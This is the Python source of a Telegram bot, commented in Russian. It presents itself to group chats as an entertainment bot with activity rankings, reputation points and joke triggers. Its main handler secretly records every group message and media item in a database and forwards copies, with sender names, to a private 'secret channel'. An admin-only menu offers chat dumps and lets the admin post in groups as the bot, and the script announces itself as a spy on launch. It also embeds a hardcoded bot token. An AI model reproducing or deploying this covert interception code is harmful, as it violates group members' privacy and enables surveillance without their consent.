import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReactionTypeEmoji
import sqlite3
import random

# --- НАСТРОЙКИ ---
BOT_TOKEN = '8304060216:AAFlFiARVda3ydlLCT0WtPbMBT3tapZU1pI'
ADMIN_ID = 8705859046           # Твой личный ID
LOG_CHANNEL_ID = -1004316644119 # ID твоего приватного канала (обязательно начинается с -100)

bot = telebot.TeleBot(BOT_TOKEN)

# --- ИНИЦИАЛИЗАЦИЯ БАЗЫ ---
conn = sqlite3.connect('chat_logger.db', check_same_thread=False)
cursor = conn.cursor()

# Таблица сообщений
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        chat_title TEXT,
        user_id INTEGER,
        username TEXT,
        text TEXT,
        media_type TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
''')

# Таблица репутации
cursor.execute('''
    CREATE TABLE IF NOT EXISTS reputation (
        chat_id INTEGER,
        user_id INTEGER,
        username TEXT,
        score INTEGER DEFAULT 0,
        PRIMARY KEY(chat_id, user_id)
    )
''')
conn.commit()

# --- ПАНЕЛЬ УПРАВЛЕНИЯ В ЛС ---

@bot.message_handler(commands=['dump', 'start'], func=lambda m: m.chat.type == 'private')
def pm_menu(message):
    if message.from_user.id != ADMIN_ID: return
        
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages')
    chats = cursor.fetchall()
    
    if not chats:
        bot.send_message(message.chat.id, "🗄 База пуста. Бот еще ничего не перехватил.")
        return
        
    markup = InlineKeyboardMarkup()
    for chat_id, title in chats:
        chat_name = title if title else str(chat_id)
        markup.add(InlineKeyboardButton(text=f"📁 Дамп: {chat_name}", callback_data=f"dump_{chat_id}"))
        
    bot.send_message(message.chat.id, "🕵️‍♂️ Меню управления дампами:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dump_'))
def handle_dump_request(call):
    if call.from_user.id != ADMIN_ID: return
    target_chat_id = call.data.split('_')[1]
    bot.answer_callback_query(call.id, "Инициализация сборки...")
    bot.edit_message_text(f"⏳ Готовлю HTML-архив для чата <code>{target_chat_id}</code>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')


# --- КОМАНДА /face (ПИСАТЬ ОТ ЛИЦА БОТА) ---

@bot.message_handler(commands=['face'], func=lambda m: m.chat.type == 'private')
def cmd_face(message):
    if message.from_user.id != ADMIN_ID: return
    
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages')
    chats = cursor.fetchall()
    if not chats:
        bot.send_message(message.chat.id, "Я еще не состою ни в одном чате с историей.")
        return
        
    markup = InlineKeyboardMarkup()
    for chat_id, title in chats:
        chat_name = title if title else str(chat_id)
        markup.add(InlineKeyboardButton(text=f"🗣 {chat_name}", callback_data=f"face_{chat_id}"))
        
    bot.send_message(message.chat.id, "🎭 От чьего лица вещаем? Выбери чат:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('face_'))
def handle_face_selection(call):
    if call.from_user.id != ADMIN_ID: return
    chat_id = call.data.split('_')[1]
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(call.message.chat.id, "✍️ Напиши текст, который я должен отправить в этот чат:")
    bot.register_next_step_handler(msg, process_face_message, chat_id)

def process_face_message(message, chat_id):
    if not message.text:
        bot.send_message(message.chat.id, "❌ Поддерживается только текст. Попробуй /face еще раз.")
        return
    try:
        bot.send_message(chat_id, message.text)
        bot.send_message(message.chat.id, "✅ Сообщение успешно доставлено в группу!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка отправки: {e}")


# --- ПУБЛИЧНЫЕ КОМАНДЫ (Для групп) ---

@bot.message_handler(commands=['whoactive', 'top'])
def cmd_whoactive(message):
    if message.chat.type == 'private': return
    
    # Топ флудеров
    cursor.execute('SELECT username, COUNT(*) as msg_count FROM messages WHERE chat_id = ? GROUP BY user_id ORDER BY msg_count DESC LIMIT 5', (message.chat.id,))
    top_users = cursor.fetchall()
    
    # Топ репутации
    cursor.execute('SELECT username, score FROM reputation WHERE chat_id = ? AND score > 0 ORDER BY score DESC LIMIT 3', (message.chat.id,))
    top_rep = cursor.fetchall()

    text = "🔥 <b>Топ активности:</b>\n"
    if top_users:
        medals = ['🥇', '🥈', '🥉', '🏅', '🏅']
        for i, u in enumerate(top_users):
            text += f"{medals[i]} {u[0] or 'Аноним'} — {u[1]} сообщ.\n"
    else:
        text += "Пока пусто.\n"

    if top_rep:
        text += "\n🌟 <b>Самые уважаемые:</b>\n"
        for i, r in enumerate(top_rep):
            text += f"⭐️ {r[0] or 'Аноним'} — {r[1]} реп.\n"

    bot.reply_to(message, text, parse_mode="HTML")


# --- ГЛАВНЫЙ СЛУХАЧ (Группы: Запись, Триггеры, Реакции) ---

@bot.message_handler(func=lambda m: m.chat.type in ['group', 'supergroup'], content_types=['text', 'photo', 'video', 'voice', 'document', 'animation', 'sticker'])
def log_and_interact(message):
    if message.text and message.text.startswith('/'): return

    chat_id = message.chat.id
    chat_title = message.chat.title
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    text_content = message.text or message.caption or ""
    text_lower = text_content.lower().strip()
    
    # 1. ЗАПИСЬ В БАЗУ
    cursor.execute('INSERT INTO messages (chat_id, chat_title, user_id, username, text, media_type) VALUES (?, ?, ?, ?, ?, ?)', 
                   (chat_id, chat_title, user_id, username, text_content, message.content_type))
    conn.commit()

    # 2. ПЕРЕСЫЛКА В СЕКРЕТНЫЙ КАНАЛ
    try:
        copied = bot.copy_message(LOG_CHANNEL_ID, chat_id, message.message_id)
        fwd = f"\n🔄 Переслано" if message.forward_from or hasattr(message, 'forward_sender_name') and message.forward_sender_name else ""
        bot.send_message(LOG_CHANNEL_ID, f"📍 Чат: {chat_title}\n👤 От: @{username}{fwd}", reply_to_message_id=copied.message_id)
    except: pass

    # 3. СИСТЕМА РЕПУТАЦИИ (Ответ на сообщение плюсиком)
    if message.reply_to_message and text_lower in ['+', '👍', 'спасибо', 'спс', 'лучший']:
        target = message.reply_to_message.from_user
        if target.id == user_id:
            bot.reply_to(message, "Нельзя повысить репутацию самому себе! 🤨")
        elif target.is_bot:
            bot.reply_to(message, "Ботам репутация ни к чему 🤖")
        else:
            t_name = target.username or target.first_name
            cursor.execute('INSERT OR IGNORE INTO reputation (chat_id, user_id, username, score) VALUES (?, ?, ?, 0)', (chat_id, target.id, t_name))
            cursor.execute('UPDATE reputation SET score = score + 1 WHERE chat_id = ? AND user_id = ?', (chat_id, target.id))
            conn.commit()
            bot.reply_to(message, f"📈 Репутация <b>{t_name}</b> повышена!", parse_mode="HTML")

    # 4. ТРИГГЕРЫ: "Бот, кто..."
    elif text_lower.startswith('бот, кто'):
        cursor.execute('SELECT DISTINCT username FROM messages WHERE chat_id = ? AND username IS NOT NULL', (chat_id,))
        users = [row[0] for row in cursor.fetchall()]
        if users:
            target = random.choice(users)
            winter_emojis = ['❄️', '⛄', '🧊', '🎿', '🏂', '🏔']
            bot.reply_to(message, f"Я думаю, что @{target} {random.choice(winter_emojis)}")
        else:
            bot.reply_to(message, "Я еще никого не знаю в этом чате. 🤷‍♂️")

    # 5. ТРИГГЕРЫ: "Бот, шип"
    elif text_lower.startswith('бот, шип'):
        cursor.execute('SELECT DISTINCT username FROM messages WHERE chat_id = ? AND username IS NOT NULL', (chat_id,))
        users = [row[0] for row in cursor.fetchall()]
        if len(users) >= 2:
            pair = random.sample(users, 2)
            percent = random.randint(0, 100)
            bot.reply_to(message, f"🕵️‍♂️ Агентурная сеть докладывает:\n\n@{pair[0]} и @{pair[1]} совместимы на {percent}% 💘")
        else:
            bot.reply_to(message, "Для шипперинга нужно чтобы в чате общалось хотя бы 2 человека! 💔")

    # 6. СЛУЧАЙНЫЕ РЕАКЦИИ (10% Шанс)
    if random.randint(1, 100) <= 10:
        emojis = ['👍', '🔥', '👀', '🤣', '🤔', '😎', '🎉', '🌚']
        try:
            bot.set_message_reaction(chat_id, message.message_id, [ReactionTypeEmoji(random.choice(emojis))], is_big=False)
        except: pass


# --- УВЕДОМЛЕНИЕ АДМИНА ПРИ СТАРТЕ ---
def notify_startup():
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages')
    chats = cursor.fetchall()
    if chats:
        chat_list = "\n".join([f"🔸 {title or cid}" for cid, title in chats])
        msg = f"🫡 Я в строю!\n\nРаботаю в этих чатах:\n{chat_list}\n\nНе желаешь заглянуть? Пиши /face"
    else:
        msg = "🫡 Я в строю!\nБаза пока пуста, жду добавления в группы."
    
    try:
        bot.send_message(ADMIN_ID, msg)
    except Exception as e:
        print(f"Не удалось написать админу: {e}")

# ЗАПУСК
print("Шпион запущен!")
notify_startup()
bot.infinity_polling()
